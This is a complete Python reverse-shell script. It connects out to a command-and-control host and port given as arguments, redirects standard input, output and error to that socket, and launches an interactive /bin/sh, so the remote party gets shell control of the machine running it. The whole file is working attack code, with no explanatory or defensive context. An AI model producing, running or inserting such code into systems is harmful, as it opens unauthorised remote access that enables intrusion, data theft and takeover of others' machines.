#!/usr/bin/env python
import socket, subprocess, os, sys


cc_ip = sys.argv[1]
cc_port = int(sys.argv[2])

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect((cc_ip, cc_port));

os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);

p=subprocess.call(["/bin/sh","-i"]);
